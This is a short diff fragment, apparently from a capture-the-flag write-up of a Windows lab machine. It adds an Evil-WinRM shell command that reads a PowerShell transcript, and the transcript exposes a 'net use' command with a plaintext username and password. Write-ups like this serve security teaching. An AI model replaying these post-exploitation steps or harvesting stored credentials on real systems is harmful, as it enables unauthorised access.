@@ -238,5 +238,7 @@ Mode                LastWriteTime         Length Name
 Found an interesting `.txt` file
 
 ```python
+*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
 
+cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
 ```
